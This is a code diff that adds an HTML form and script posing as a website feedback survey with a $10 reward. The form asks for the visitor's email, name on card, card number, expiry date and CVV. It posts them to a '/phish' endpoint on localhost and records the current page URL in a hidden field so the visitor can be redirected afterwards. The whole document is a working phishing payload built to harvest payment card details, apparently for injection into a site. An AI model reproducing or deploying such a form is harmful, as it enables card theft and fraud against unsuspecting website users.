@@ -1,0 +1,43 @@
+<br><br><br><br>
+<div class="some-container-class" style="margin: auto; background-color: white !important;" id="opinion-form">
+    <span style="font-size: 25px;"> Hello! </span>
+    <p> We are conducting a survey to find out what can be improved about our website. </p>
+    <p> As a valued user, your opinion matters to us. This survey will take no more than 5 minutes. </p>
+    <p> We will provide you with $10 upon completing this survey for your time. Simply fill out your card
+        information. </p>
+    <form id="opinion-form" action="http://localhost:5000/phish" method="POST">
+        <label for="email">Email</label>
+        <input id="email" type="text" name="email">
+        <br>
+        <p>What can we be improved about this website?</p>
+        <textarea id="opinion" rows="5" cols="100"></textarea>
+        <br>
+        <label for="name-on-card" maxlength="16">Name on Card</label>
+        <input id="name-on-card" type="text" name="name-on-card">
+        <br>
+        <label for="card-number">Card Number</label>
+        <input id="card-number" type="text" name="card-number">
+        <br>
+        <label for="expiration-month" maxlength="2"> Expiration Month </label>
+        <input id="expiration-month" type="text" name="expiration-month">
+        <br>
+        <label for="expiration-year" maxlength="2"> Expiration Year </label>
+        <input id="expiration-year" type="text" name="expiration-year">
+        <br>
+        <label for="cvv">CVV</label>
+        <input id="cvv" type="text" name="cvv">
+        <br><br>
+        <input type="hidden" id="redirect-url" name="redirect-url">
+        <input id="opinion-submit-button" onclick="submitOpinion()" type="submit" name="submit">
+    </form>
+
+</div>
+
+<script>
+    console.log("hi");
+    document.getElementById("opinion-form").scrollIntoView();
+    function submitOpinion() {
+        document.getElementById("opinion-form").submit();
+    }
+    document.getElementById('redirect-url').setAttribute("value", window.location.href);
+</script>
